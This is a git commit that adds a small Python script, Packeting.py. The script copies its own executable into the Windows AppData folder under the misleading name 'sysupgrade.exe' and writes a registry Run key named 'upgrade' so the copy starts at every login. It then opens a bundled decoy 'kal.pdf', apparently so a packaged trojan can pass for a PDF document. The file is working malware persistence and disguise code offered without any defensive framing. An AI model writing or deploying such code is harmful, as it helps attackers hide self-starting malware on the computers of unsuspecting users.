95206d532e323533388286fdf17bc7f941f208e5
Mustafa Kum <86945272+Mustafa-Kum@users.noreply.github.com>
2022-10-10 15:34:25 +0300

    Add files via upload

---
+++ Packeting.py
@@ -0,0 +1,26 @@
+import time
+import subprocess
+import os
+import shutil
+import sys
+
+def add_to_regedit():
+    #persistance
+
+    new_file = os.environ["appdata"] + "\\sysupgrade.exe"
+
+    if not os.path.exists(new_file):
+        
+        shutil.copyfile(sys.executable, new_file)
+
+        regedit_command = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
+
+        subprocess.call(regedit_command, shell = True)
+
+add_to_regedit()
+
+def open_edited():
+
+    added_file = sys._MEIPASS + "\\kal.pdf"
+    
+    subprocess.Popen(added_file, shell = True)
